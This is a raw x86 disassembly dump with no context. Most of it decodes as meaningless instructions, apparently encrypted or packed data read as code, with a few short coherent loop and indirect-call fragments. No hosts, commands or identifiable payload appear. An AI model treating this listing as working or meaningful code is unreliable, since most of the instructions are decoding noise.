  4018ee:	mov    ss,esi
  4018f0:	je     0x40196d
  4018f2:	xchg   edi,eax
  4018f3:	xchg   esi,eax
  4018f4:	sbb    BYTE PTR [ebx+0x4fd1073a],dh
  4018fa:	addr16 add al,0x40
  4018fd:	mov    edi,0x78d677f2
  401902:	das    
  401903:	and    ah,bh
  401905:	jl     0x4018f7
  401907:	aaa    
  401908:	mov    cl,BYTE PTR [edx+0x3a]
  40190b:	(bad)  [edx+0x4748f58a]
  401911:	ror    DWORD PTR [ebx+esi*4-0x28],cl
  401915:	fdiv   st(4),st
  401917:	cmp    DWORD PTR [ebp-0x620a4786],ebp
  40191d:	idiv   dh
  40191f:	stos   DWORD PTR es:[edi],eax
  401920:	xchg   ebx,eax
  401921:	sub    eax,0x952163b7
  401926:	out    0x23,eax
  401928:	shl    dh,cl
  40192a:	mov    ebp,0x10758947
  40192f:	nop
  401930:	scas   al,BYTE PTR es:[edi]
  401931:	popa   
  401932:	sub    dh,dh
  401934:	idiv   DWORD PTR [esi]
  401936:	imul   al
  401938:	jnp    0x4018d6
  40193a:	push   ebx
  40193b:	xlat   BYTE PTR ds:[ebx]
  40193c:	sub    eax,edx
  40193e:	imul   ebx,DWORD PTR [eax],0xffffffa6
  401941:	lds    esi,FWORD PTR [ecx-0x457f62bd]
  401947:	sbb    ecx,ecx
  401949:	and    ch,BYTE PTR [ecx-0x6de9b52a]
  40194f:	dec    esi
  401950:	ins    DWORD PTR es:[edi],dx
  401951:	std    
  401952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401953:	xor    edx,ebp
  401955:	test   cl,ch
  401957:	dec    esp
  401958:	fiadd  WORD PTR [ebp-0x37]
  40195b:	sub    al,0x67
  40195d:	dec    esi
  40195e:	xchg   edi,eax
  40195f:	dec    ebp
  401960:	mov    cs,WORD PTR [ebp+0x51eb6399]
  401966:	and    al,0x73
  401968:	mov    ds:0xc01365a5,eax
  40196d:	lods   eax,DWORD PTR ds:[esi]
  40196e:	les    edi,FWORD PTR [eax]
  401970:	div    dl
  401972:	rcr    BYTE PTR ds:0x859219e0,0x7c
  401979:	jbe    0x4019e9
  40197b:	push   0xd6dd9100
  401980:	bound  edi,QWORD PTR [eax+edi*1-0x3c0034c5]
  401987:	call   0x2897:0xb1083b3e
  40198e:	xchg   esi,eax
  40198f:	outs   dx,BYTE PTR ds:[esi]
  401990:	sbb    edi,0x75c0c991
  401996:	inc    ebx
  401997:	mov    DWORD PTR [edi+0x6a],ebp
  40199a:	shl    DWORD PTR [eax+ebp*8-0x3d0cbf19],1
  4019a1:	dec    esp
  4019a2:	push   edi
  4019a3:	xor    al,0xd7
  4019a5:	(bad)  
  4019a6:	call   0x7d5c52e2
  4019ab:	dec    ebx
  4019ac:	nop
  4019ad:	shl    bh,1
  4019af:	clc    
  4019b0:	loopne 0x401939
  4019b2:	push   0x42
  4019b4:	mov    dl,0xcd
  4019b6:	mov    eax,0x71d5272b
  4019bb:	icebp  
  4019bc:	sbb    edx,DWORD PTR [eax]
  4019be:	jmp    0x1f6f4d
  4019c3:	push   ds
  4019c4:	push   edi
  4019c5:	xchg   ecx,eax
  4019c6:	xor    al,BYTE PTR fs:[edi-0x6]
  4019ca:	or     BYTE PTR [edi+0x53],0x64
  4019ce:	jne    0x4019be
  4019d0:	aaa    
  4019d1:	xor    cl,BYTE PTR [edi-0x4aed6a69]
  4019d7:	(bad)  [ecx]
  4019d9:	mov    dl,0xeb
  4019db:	pop    esp
  4019dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019dd:	fdiv   st(6),st
  4019df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019e0:	lock js 0x401979
  4019e3:	cmp    DWORD PTR [ecx-0x3ef8a92b],0x29
  4019ea:	push   eax
  4019eb:	and    edi,edi
  4019ed:	jl     0x4019d1
  4019ef:	nop
  4019f0:	imul   ecx,DWORD PTR [esi],0xffffffd0
  4019f3:	addr16 fwait
  4019f5:	xchg   esp,eax
  4019f6:	mov    al,ch
  4019f8:	call   0xb518d02f
  4019fd:	jnp    0x4019f9
  4019ff:	(bad)  
  401a00:	test   eax,0xafc09cf
  401a05:	call   FWORD PTR [bp+0x5ec9]
  401a0a:	adc    eax,0xd13155e3
  401a0f:	dec    eax
  401a10:	mov    esp,DWORD PTR [ebx+0x6f87230]
  401a16:	mov    ds:0xa55d73a0,al
  401a1b:	fiadd  WORD PTR [ebp+eiz*8+0x410ca50f]
  401a22:	sbb    DWORD PTR [esi-0x26],esi
  401a25:	dec    esi
  401a26:	cmp    ch,bh
  401a28:	dec    ebx
  401a29:	and    DWORD PTR [edi+0x4d],0x4fe973f0
  401a30:	loop   0x4019d0
  401a32:	mov    edi,DWORD PTR [esi+ebp*2]
  401a35:	jne    0x401a20
  401a37:	sbb    al,0xc2
  401a39:	pop    esi
  401a3a:	mov    esi,0x43afe430
  401a3f:	addr16 jns 0x4019eb
  401a42:	les    ecx,FWORD PTR [esi]
  401a44:	sahf   
  401a45:	cmp    BYTE PTR [ebp+0x6],bh
  401a48:	cmc    
  401a49:	mov    edi,0x994c620f
  401a4e:	call   0xe37:0xf18f1d0a
  401a55:	push   cs
  401a56:	lods   eax,DWORD PTR ds:[esi]
  401a57:	aam    0x5f
  401a59:	and    edx,edx
  401a5b:	cld    
  401a5c:	nop
  401a5d:	adc    BYTE PTR [esp+ebp*4+0x458b48e7],ch
  401a64:	or     BYTE PTR [ecx+0x43474f25],al
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	add    BYTE PTR [eax],al
  401a6e:	add    BYTE PTR [ebx+0x43474f0d],cl
  401a74:	add    BYTE PTR [ecx-0x77],al
  401a77:	or     eax,0x43474f
  401a7c:	cmp    DWORD PTR ds:0x43474f,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x43474f,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x43474f
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x43474f,ecx
  401aae:	cmp    DWORD PTR ds:0x43474f,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0xfc58485e
  401ae8:	pusha  
  401ae9:	cli    
  401aea:	push   edx
  401aeb:	add    al,0x7e
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401ab4
  401af3:	(bad)  
  401af4:	enter  0xdb7b,0xb4
  401af8:	dec    ebx
  401af9:	clc    
  401afa:	shl    edx,cl
  401afc:	cmp    edx,DWORD PTR [ecx-0x53c3da6e]
  401b02:	int    0x1e
  401b04:	add    BYTE PTR [esi],dl
  401b06:	dec    esp
  401b07:	jo     0x401aa1
  401b09:	enter  0x4ee8,0x59
  401b0d:	push   es
  401b0e:	or     DWORD PTR [edi-0x1689ea26],edx
  401b14:	fdivrp st(0),st
  401b16:	pop    edi
  401b17:	xor    al,0x5b
  401b19:	lods   eax,DWORD PTR ds:[esi]
  401b1a:	pusha  
  401b1b:	push   esp
  401b1c:	mov    es,WORD PTR ds:[edx]
  401b1f:	push   ebx
  401b20:	mov    dh,BYTE PTR [edi]
  401b22:	adc    BYTE PTR [ebp+0x7a],dl
  401b25:	mov    edi,0xc3580e98
  401b2a:	mov    al,ds:0xeb330362
  401b2f:	punpckldq mm6,DWORD PTR [edi+0x0]
  401b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b34:	stc    
  401b35:	push   edi
  401b36:	mov    esp,0xeefff7bd
  401b3b:	in     al,0x88
  401b3d:	test   BYTE PTR [ebx+0x38],bh
  401b40:	out    dx,eax
  401b41:	mov    bh,0xe3
  401b43:	lahf   
  401b44:	popf   
  401b45:	inc    edi
  401b46:	xor    al,0xbe
  401b48:	fcom   DWORD PTR ds:0xcea13195
  401b4e:	adc    BYTE PTR [ebx-0xb123e4a],ch
  401b54:	nop
  401b55:	bound  ebx,QWORD PTR [esi+0x46]
  401b58:	cli    
  401b59:	jmp    0x306b:0x1d78f7d1
  401b60:	ret    
  401b61:	push   edi
  401b62:	(bad)  
  401b63:	fsubr  DWORD PTR [eax+0x24]
  401b66:	je     0x401b0a
  401b68:	xor    DWORD PTR [ebp+0x2c31995c],ecx
  401b6e:	mov    ecx,0xce7f7dd0
  401b73:	jbe    0x401bb3
  401b75:	(bad)  
  401b76:	cmp    al,0xde
  401b78:	pushf  
  401b79:	mov    al,0xd6
  401b7b:	xchg   esi,eax
  401b7c:	push   ds
  401b7d:	sbb    DWORD PTR [edi-0x14961470],esi
  401b83:	jg     0x401c01
  401b85:	nop
  401b86:	inc    eax
  401b87:	out    0xb,al
  401b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b8a:	xchg   ebx,eax
  401b8b:	adc    ecx,DWORD PTR [edx-0x70]
  401b8e:	scas   al,BYTE PTR es:[edi]
  401b8f:	push   es
  401b90:	dec    esp
  401b91:	or     dl,ah
  401b93:	loop   0x401bab
  401b95:	dec    ecx
  401b96:	cdq    
  401b97:	sbb    ebx,edi
  401b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b9a:	vpmacssdd ymm15,ymm2,ymm2,ymm1
  401ba0:	inc    eax
  401ba1:	test   al,0x55
  401ba3:	ins    DWORD PTR es:[edi],dx
  401ba4:	pop    ds
  401ba5:	dec    esi
  401ba6:	lods   al,BYTE PTR ds:[esi]
  401ba7:	or     DWORD PTR [eax+0x2b],ebp
  401baa:	out    dx,al
  401bab:	xchg   esi,eax
  401bac:	mov    esi,0xaf181296
  401bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bb2:	push   esp
  401bb3:	jae    0x401b49
  401bb5:	push   edx
  401bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bb7:	pop    es
  401bb8:	(bad)  
  401bba:	fstp   TBYTE PTR [ebx-0x29c6e961]
  401bc0:	imul   DWORD PTR [esi+0x791d6f40]
  401bc6:	inc    ebx
  401bc7:	inc    edi
  401bc8:	xor    BYTE PTR [eax-0x200ffa85],bh
  401bce:	(bad)  
  401bd0:	aad    0xf
  401bd2:	dec    ebx
  401bd3:	test   al,0x26
  401bd5:	fild   QWORD PTR [ecx+ebp*8+0x3e4a3c9b]
  401bdc:	stc    
  401bdd:	pusha  
  401bde:	(bad)  
  401bdf:	fisttp DWORD PTR [eax-0x48]
  401be2:	jmp    DWORD PTR [edx-0x2a3b20a1]
  401be8:	mov    BYTE PTR [ebx+0x681d992b],0x8e
  401bef:	or     BYTE PTR [eax+0x5196b5a5],0xd3
  401bf6:	idiv   ebp
  401bf8:	aaa    
  401bf9:	jg     0x401c78
  401bfb:	adc    BYTE PTR [edx+0x110cf404],ch
  401c01:	jo     0x401bc4
  401c03:	pop    esi
  401c04:	js     0x401bca
  401c06:	(bad)  
  401c07:	(bad)  [esi]
  401c09:	sub    BYTE PTR ds:0x6f1843af,bh
  401c0f:	jo     0x401bd1
  401c11:	push   esi
  401c12:	cmp    ax,0x3312
  401c16:	js     0x401c03
  401c18:	ret    0x970e
  401c1b:	mov    ds:0x905e8f52,al
  401c20:	mov    edx,0x40e91312
  401c25:	out    0x7f,eax
  401c27:	or     cl,BYTE PTR [ecx-0x536bbb46]
  401c2d:	xor    al,0xbe
  401c2f:	fs jp  0x401c08
  401c32:	hlt    
  401c33:	sub    eax,0xcb5aa0c2
  401c39:	loope  0x401c9e
  401c3b:	stc    
  401c3c:	push   ecx
  401c3d:	and    DWORD PTR [edx-0x18],esp
  401c40:	popa   
  401c41:	pop    ss
  401c42:	mov    WORD PTR [ecx-0x52b798d7],es
  401c48:	xchg   ebp,eax
  401c49:	jno    0x401cad
  401c4b:	retf   0xfc84
  401c4e:	jmp    0x2130:0xb433fbba
  401c55:	iret   
  401c56:	addr16 inc esi
  401c58:	jns    0x401c4d
  401c5a:	mov    ah,0xb
  401c5c:	packsswb mm2,QWORD PTR [edi-0x1d]
  401c60:	data16 rcr BYTE PTR [edi+0x6118c73d],1
  401c67:	mov    bh,0xf6
  401c69:	(bad)  
  401c6a:	mov    edi,0xdd697cd7
  401c6f:	fcmovu st,st(3)
  401c71:	in     al,dx
  401c72:	mov    ecx,0xc526adc3
  401c77:	std    
  401c78:	dec    ebx
  401c79:	mov    ds:0xd2bcf1d9,eax
  401c7e:	lock jle 0x401c16
  401c81:	test   eax,0xca5da53f
  401c86:	in     eax,0x1f
  401c88:	test   al,0x77
  401c8a:	icebp  
  401c8b:	sbb    al,0x4
  401c8d:	xchg   edi,eax
  401c8e:	push   ecx
  401c8f:	cwde   
  401c90:	popa   
  401c91:	aas    
  401c92:	fmul   DWORD PTR [ecx]
  401c94:	jg     0x401c56
  401c96:	sbb    bh,bh
  401c98:	push   cs
  401c99:	div    BYTE PTR [ecx+edx*1+0x2b00bc15]
  401ca0:	jb     0x401cc5
  401ca2:	pop    edx
  401ca3:	sbb    al,0xb6
  401ca5:	lods   al,BYTE PTR ds:[esi]
  401ca6:	xor    eax,0xd2a11da5
  401cab:	dec    ebx
  401cac:	inc    ecx
  401cad:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401cb3:	cld    
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	test   BYTE PTR [eax+0x6891ac4],dh
  401cd0:	jle    0x401d50
  401cd2:	mov    ch,0x7f
  401cd4:	jle    0x401d54
  401cd6:	xchg   DWORD PTR [edi+0x786ac592],edi
  401cdc:	stos   DWORD PTR es:[edi],eax
  401cdd:	test   al,0x1e
  401cdf:	mov    bl,BYTE PTR [edx-0xb27e9da]
  401ce5:	sbb    eax,0x8ae1fff4
  401cea:	daa    
  401ceb:	mov    esi,0x26024f78
  401cf0:	and    ebp,DWORD PTR ss:[ebx+0x5b]
  401cf4:	fldcw  WORD PTR [ebp-0x6931c175]
  401cfa:	in     eax,dx
  401cfb:	push   eax
  401cfc:	push   esp
  401cfd:	out    dx,eax
  401cfe:	dec    ebx
  401cff:	jl     0x401cfc
  401d01:	(bad)
  401d05:	jne    0x401c98
  401d07:	add    BYTE PTR [eax],ch
  401d09:	and    dh,BYTE PTR [edi]
  401d0b:	or     dl,BYTE PTR [edi+0x135745b8]
  401d11:	push   esi
  401d12:	fidivr DWORD PTR [ebp-0x4]
  401d15:	cld    
  401d16:	dec    ebp
  401d17:	adc    ebp,DWORD PTR ds:0xad164293
  401d1d:	push   edi
  401d1e:	bound  edx,QWORD PTR [eax+0x2c975e14]
  401d24:	add    ecx,edx
  401d26:	int    0x1e
  401d28:	inc    BYTE PTR [edi+0x54]
  401d2b:	cld    
  401d2c:	lahf   
  401d2d:	sbb    DWORD PTR [edi-0x3e63a9fe],0x6dbbad8b
  401d37:	pop    es
  401d38:	mov    WORD PTR [ebp-0x223aafc4],?
  401d3e:	das    
  401d3f:	outs   dx,DWORD PTR ds:[esi]
  401d40:	jl     0x401d61
  401d42:	call   0x8b94:0xe78099af
  401d49:	sbb    cl,dh
  401d4b:	or     bl,dl
  401d4d:	and    BYTE PTR [ecx],cl
  401d4f:	or     al,0xd4
  401d51:	cmc    
  401d52:	mov    ds,WORD PTR [edx-0x45]
  401d55:	aas    
  401d56:	or     dh,dh
  401d58:	cmp    DWORD PTR [eax-0x77],ebx
  401d5b:	sti    
  401d5c:	(bad)  
  401d5d:	(bad)  
  401d5e:	push   esp
  401d60:	mov    ebp,DWORD PTR [eax-0x23]
  401d63:	and    esp,ebp
  401d65:	cmp    eax,0x3b566416
  401d6a:	repz aas 
  401d6c:	ins    BYTE PTR es:[edi],dx
  401d6d:	aaa    
  401d6e:	rcr    bl,1
  401d70:	addr16 int3 
  401d72:	adc    eax,0xb77675b1
  401d77:	dec    esi
  401d78:	mov    ch,0x13
  401d7a:	iret   
  401d7b:	and    ecx,edx
  401d7d:	shr    bh,1
  401d7f:	push   edx
  401d80:	sub    al,0x3e
  401d82:	xchg   edi,eax
  401d83:	sbb    al,0xd9
  401d85:	xor    eax,0x3c63f65a
  401d8a:	aam    0x86
  401d8c:	pop    ss
  401d8d:	icebp  
  401d8e:	mov    eax,0xef5f4238
  401d93:	inc    edi
  401d94:	loop   0x401e0c
  401d96:	stc    
  401d97:	xor    BYTE PTR [esi-0x170c4a09],bh
  401d9d:	add    ebp,ecx
  401d9f:	sbb    ecx,edx
  401da1:	icebp  
  401da2:	mov    ds:0x7f69b409,al
  401da7:	push   eax
  401da8:	sub    al,0x8c
  401daa:	inc    eax
  401dab:	mov    ebp,0x1fa8ac65
  401db0:	adc    edx,ebx
  401db2:	(bad)  
  401db3:	jns    0x401d9d
  401db5:	mov    dh,0x2f
  401db7:	popa   
  401db8:	xlat   BYTE PTR ds:[ebx]
  401db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dba:	xlat   BYTE PTR ds:[ebx]
  401dbb:	std    
  401dbc:	das    
  401dbd:	push   0xe5af4ca8
  401dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dc3:	xchg   ebp,eax
  401dc4:	add    BYTE PTR [ecx],0x6b
  401dc7:	int    0x45
  401dc9:	push   0xffffffc2
  401dcb:	jne    0x401d52
  401dcd:	or     bl,BYTE PTR ds:0x2e733d77
  401dd3:	mov    ?,esi
  401dd5:	cmp    eax,edx
  401dd7:	icebp  
  401dd8:	bound  edi,QWORD PTR ds:0xc3ed7de5
  401dde:	mov    ds:0x2943ef4a,al
  401de3:	add    DWORD PTR [ecx+eax*2-0x58f38796],ebx
  401dea:	adc    BYTE PTR [edx+ebx*8],dh
  401ded:	(bad)  
  401dee:	xchg   esp,eax
  401def:	mov    bh,0x67
  401df1:	inc    esi
  401df2:	inc    eax
  401df3:	rcl    BYTE PTR [esi+0x6f6cc445],0x2c
  401dfa:	adc    eax,0x6c8d11c4
  401dff:	lahf   
  401e00:	fisttp DWORD PTR [edx]
  401e02:	stc    
  401e03:	adc    al,0xd9
  401e05:	out    0x4a,al
  401e07:	daa    
  401e08:	scas   al,BYTE PTR es:[edi]
  401e09:	and    eax,0xabb28192
  401e0e:	sub    ch,BYTE PTR [edx+0x76]
  401e11:	sub    DWORD PTR [edi],0xbc79b4c5
  401e17:	sbb    al,0xac
  401e19:	mov    eax,eax
  401e1b:	stos   BYTE PTR es:[edi],al
  401e1c:	aas    
  401e1d:	jmp    0x15fae7e1
  401e22:	iret   
  401e23:	mov    cl,BYTE PTR [eax]
  401e25:	ins    DWORD PTR es:[edi],dx
  401e26:	jo     0x401e5d
  401e28:	fist   WORD PTR [eax+0x319abb87]
  401e2e:	rcr    DWORD PTR [edi],1
  401e30:	xor    ebx,DWORD PTR [ebp+eiz*8+0xe3478a7]
  401e37:	inc    ebx
  401e38:	adc    DWORD PTR [ecx+0x9],0xffffffbd
  401e3c:	xchg   esp,eax
  401e3d:	shr    BYTE PTR [ebp-0xb0cc59c],1
  401e43:	jbe    0x401e5d
  401e45:	int    0x41
  401e47:	push   0xffffffcc
  401e49:	out    dx,eax
  401e4a:	arpl   WORD PTR [ebp+0x7d],si
  401e4d:	mov    BYTE PTR [ebp-0x185f31a8],dh
  401e53:	je     0x401e4a
  401e55:	push   ebx
  401e56:	dec    esp
  401e57:	push   ebx
  401e58:	pop    ss
  401e59:	clc    
  401e5a:	and    DWORD PTR [edx],edx
  401e5c:	xchg   esi,eax
  401e5d:	loope  0x401e6e
  401e5f:	fisttp QWORD PTR [ecx-0x74679029]
  401e65:	push   esp
  401e66:	jno    0x401e83
  401e68:	sub    al,0xa
  401e6a:	retf   0xdef6
  401e6d:	std    
  401e6e:	into   
  401e6f:	mov    esi,0xec52e21e
  401e74:	inc    edi
  401e75:	(bad)  
  401e76:	fidiv  DWORD PTR [ebx+0x29ecbfb7]
  401e7c:	push   esp
  401e7d:	aas    
  401e7e:	daa    
  401e7f:	cmp    eax,0xc8e9bc8d
  401e84:	les    ebp,FWORD PTR [ecx+ecx*8]
  401e87:	pop    ebp
  401e88:	push   eax
  401e89:	clc    
  401e8a:	je     0x401e27
  401e8c:	aam    0x89
  401e8e:	dec    ebp
  401e8f:	call   0x8b4c641f
  401e94:	dec    ebp
  401e95:	or     al,0x33
  401e97:	mov    BYTE PTR [ebx],0xc0
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	(bad)  
  401eb0:	mov    ebp,0xc09025
  401eb5:	jle    0x401f35
  401eb7:	mov    ch,0x7f
  401eb9:	jle    0x401f39
  401ebb:	fcmovnu st,st(0)
  401ebd:	das    
  401ebe:	cwde   
  401ebf:	dec    ebx
  401ec0:	add    eax,0x88cc4726
  401ec5:	xchg   ecx,eax
  401ec6:	(bad)  
  401ec7:	pop    eax
  401ec8:	rdmsr  
  401eca:	loopne 0x401f38
  401ecc:	pop    eax
  401ecd:	cli    
  401ece:	or     BYTE PTR [ebx],dh
  401ed0:	pop    edi
  401ed1:	out    dx,al
  401ed2:	adc    BYTE PTR [ebx-0xbd9219a],cl
  401ed8:	and    BYTE PTR [esi+0x66],ch
  401edb:	jecxz  0x401ecf
  401edd:	cld    
  401ede:	mov    al,ds:0xed216868
  401ee3:	mov    ah,0xd
  401ee5:	ins    BYTE PTR es:[edi],dx
  401ee6:	aaa    
  401ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ee8:	call   0x18073e65
  401eed:	add    BYTE PTR [ecx-0x26],dh
  401ef0:	push   esi
  401ef1:	xor    DWORD PTR ds:0xb8d6706f,ecx
  401ef7:	dec    eax
  401ef8:	jno    0x401f47
  401efa:	dec    ebx
  401efb:	cmp    ah,cl
  401efd:	push   ss
  401efe:	mov    bl,0xd9
  401f00:	scas   eax,DWORD PTR es:[edi]
  401f01:	repz push edi
  401f03:	ja     0x401f7f
  401f05:	mov    ecx,0x5fa66b4c
  401f0a:	inc    eax
  401f0b:	jmp    0x401e94
  401f0d:	mov    al,0x98
  401f0f:	mov    bh,0x87
  401f11:	mov    eax,0x6459b571
  401f16:	jns    0x401f71
  401f18:	leave  
  401f19:	test   DWORD PTR [ebx+0x43d3327d],0x358f45f7
  401f23:	inc    esi
  401f24:	mov    eax,ds:0x7804c397
  401f29:	and    al,0xb3
  401f2b:	sbb    al,0x96
  401f2d:	sbb    al,0xe3
  401f2f:	mov    ch,0x82
  401f31:	cwde   
  401f32:	out    dx,eax
  401f33:	mov    edx,0xee6489c1
  401f38:	jmp    0x401fa8
  401f3a:	xor    DWORD PTR ds:0xdbfe68e8,eax
  401f40:	addr16 xor al,al
  401f43:	push   esi
  401f44:	(bad)  
  401f45:	fistp  QWORD PTR [edi-0x18263ec]
  401f4b:	aaa    
  401f4c:	cli    
  401f4d:	ss shl BYTE PTR fs:[edx],cl
  401f51:	sbb    BYTE PTR [eax],dh
  401f53:	rcr    DWORD PTR [edx-0x2977f5a6],0x18
  401f5a:	mov    edi,0x1254b9c7
  401f5f:	sub    bl,cl
  401f61:	shl    ebp,0x90
  401f64:	cmp    BYTE PTR [esi],dh
  401f66:	jb     0x401efe
  401f68:	xchg   edi,eax
  401f69:	ror    BYTE PTR [eax-0x4f1a7534],1
  401f6f:	add    BYTE PTR [ecx-0x733b6ecc],cl
  401f75:	and    BYTE PTR [eax+0x2656ea60],al
  401f7b:	das    
  401f7c:	or     BYTE PTR ds:0x419ccf98,dl
  401f82:	data16 xor cl,al
  401f85:	(bad)  
  401f86:	sub    ebx,esp
  401f88:	aad    0xd9
  401f8a:	mul    ecx
  401f8c:	mov    al,ds:0x438083fa
  401f91:	inc    ebx
  401f92:	and    esi,DWORD PTR [esi+0x566c902e]
  401f98:	aaa    
  401f99:	push   ss
  401f9a:	js     0x401f5a
  401f9c:	cld    
  401f9d:	nop
  401f9e:	popa   
  401f9f:	js     0x401f96
  401fa1:	pop    esp
  401fa2:	push   es
  401fa3:	repnz (bad) 
  401fa5:	fsubp  st(2),st
  401fa7:	(bad)  
  401fa8:	mov    ebx,0xc65ef130
  401fad:	push   es
  401fae:	mov    dl,BYTE PTR [edi+0x7d603d38]
  401fb4:	cs int 0x34
  401fb7:	xor    eax,0x6090f570
  401fbc:	aad    0x7b
  401fbe:	sbb    DWORD PTR [ecx+0x15],edx
  401fc1:	mov    DWORD PTR [edi+eax*1+0x6a394b57],ecx
  401fc8:	cmp    BYTE PTR [ebx],bh
  401fca:	stos   DWORD PTR es:[edi],eax
  401fcb:	retf   
  401fcc:	or     DWORD PTR [ecx+0x7b80053e],edi
  401fd2:	adc    ch,BYTE PTR [ebp-0x6d]
  401fd5:	outs   dx,BYTE PTR ds:[esi]
  401fd6:	lock stos BYTE PTR es:[edi],al
  401fd8:	xchg   edx,eax
  401fd9:	lock inc ecx
  401fdb:	imul   ebp,DWORD PTR [edx+0x7f5068b8],0x76
  401fe2:	(bad)  
  401fe3:	ret    
  401fe4:	push   ss
  401fe5:	cli    
  401fe6:	or     BYTE PTR [ebp+0x145ee872],cl
  401fec:	jecxz  0x40206c
  401fee:	test   eax,esp
  401ff0:	jns    0x401fdc
  401ff2:	ror    DWORD PTR [edi+0x39e7dffe],cl
  401ff8:	mov    dh,0x90
  401ffa:	iret   
  401ffb:	dec    ecx
  401ffc:	fwait
  401ffd:	adc    eax,0xd1cd127a
  402002:	mov    edx,0x54854b7a
  402007:	push   ebx
  402008:	test   al,0x3c
  40200a:	xchg   ecx,eax
  40200b:	loope  0x402015
  40200d:	sub    DWORD PTR [ecx],esp
  40200f:	dec    eax
  402010:	push   ss
  402011:	mov    edi,0xcdf33871
  402016:	xor    ecx,DWORD PTR [eax-0x44]
  402019:	inc    ecx
  40201a:	sub    al,0xce
  40201c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40201d:	xchg   edi,eax
  40201e:	pop    edi
  40201f:	inc    edx
  402020:	das    
  402021:	outs   dx,BYTE PTR ds:[esi]
  402022:	pusha  
  402023:	cld    
  402024:	cmp    ah,BYTE PTR [edx+0x3e1c0937]
  40202a:	sub    eax,0xfe63bec0
  40202f:	mov    bh,0x47
  402031:	rcr    bl,cl
  402033:	mov    bh,0xb
  402035:	sti    
  402036:	jecxz  0x402072
  402038:	push   edi
  402039:	ss cmp eax,0x207df4ac
  40203f:	inc    edi
  402040:	mov    BYTE PTR [edi+0x2c],bl
  402043:	(bad)  
  402044:	fld    st(1)
  402046:	es dec esi
  402048:	sahf   
  402049:	jmp    0x7fa67116
  40204e:	enter  0xca1d,0xa4
  402052:	hlt    
  402053:	adc    cl,bl
  402055:	retf   0x26dc
  402058:	std    
  402059:	xchg   ebx,eax
  40205a:	cmp    bl,bh
  40205c:	ret    0xb910
  40205f:	mov    edi,fs
  402061:	stos   DWORD PTR es:[edi],eax
  402062:	inc    esp
  402063:	and    BYTE PTR [ecx-0x12],al
  402066:	lods   eax,DWORD PTR ds:[esi]
  402067:	mov    DWORD PTR [ebx+0x7c3dbbd4],eax
  40206d:	daa    
  40206e:	xchg   BYTE PTR [edi+0x18],dh
  402071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402072:	mov    ax,WORD PTR [ebp-0x4]
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [esi],esp
  4020a2:	add    dh,BYTE PTR [edi+0x7e027f8d]
  4020a8:	jle    0x40205f
  4020aa:	jg     0x40212a
  4020ac:	jle    0x402057
  4020ae:	mov    ds:0x672b5bf9,al
  4020b3:	push   ds
  4020b4:	or     al,0x48
  4020b6:	pop    ds
  4020b7:	mov    eax,0x19450a55
  4020bc:	(bad)  
  4020bd:	call   0xcf47:0x4696abda
  4020c4:	pop    ebx
  4020c5:	int3   
  4020c6:	ja     0x402098
  4020c8:	dec    edi
  4020c9:	pusha  
  4020ca:	mov    fs,WORD PTR [ecx-0x344d2e72]
  4020d0:	aam    0x9f
  4020d2:	and    DWORD PTR [edx-0x7c],edi
  4020d5:	popf   
  4020d6:	xor    BYTE PTR [edi+0x57a098c2],bl
  4020dc:	leave  
  4020dd:	cmp    cl,BYTE PTR ds:0xdf8b46d4
  4020e3:	lahf   
